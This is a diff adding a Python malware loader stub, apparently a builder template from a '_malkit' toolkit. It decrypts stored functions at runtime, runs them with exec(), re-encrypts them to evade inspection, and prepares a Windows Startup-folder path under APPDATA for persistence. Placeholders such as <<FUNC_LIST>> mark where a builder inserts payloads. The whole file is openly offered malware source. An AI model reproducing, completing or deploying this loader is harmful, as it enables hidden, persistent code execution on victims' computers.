@@ -1,0 +1,65 @@
+try:
+    from _malkit import genpayload 
+except Exception as e:
+    print(e)
+    pass
+    
+from _malkit import identifiers
+import sys
+from os import getenv
+import os
+import socket
+import subprocess
+from threading import Thread
+import time
+import random
+from shutil import copyfile
+
+def encrypt_file(name):
+    instance = identifiers.Malware(name)
+    instance.encrypt_file()
+
+
+def getInstance(name):
+
+    instance = identifiers.Malware(name)
+    return instance
+
+
+def load_func(instance: identifiers.Malware, func_name: str):
+    instance.decrypt_file()
+    test_func = instance.getFunc(func_name)
+    test_func.code_decrypt()
+    #print(test_func.code)
+    instance.runtime_encrypt()
+    return test_func.code
+
+def run_func(instance: identifiers.Malware, func_name: str, params=None):
+    try:
+        exec(load_func(instance, func_name), globals())
+        if params:
+            globals()[f"{func_name}"](*params)
+        else:
+            globals()[f"{func_name}"]()
+        del globals()[f"{func_name}"]
+    except Exception as Err:
+        print(Err)
+    return 0
+APPDATA = getenv('APPDATA')
+STARTUP = f"{APPDATA}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+filename = "malware.py"
+instance_path = f"{APPDATA}\\{filename}"
+_instance = getInstance(instance_path)
+
+try_min = 0
+try_max = <<TRY>>
+
+while try_min <= try_max:
+    try:
+        FUNCS = <<FUNC_LIST>>
+        for FUNC in FUNCS:
+            run_func(_instance, FUNC)
+    except Exception as Err:
+        print(Err)
+        time.sleep(5)
+    
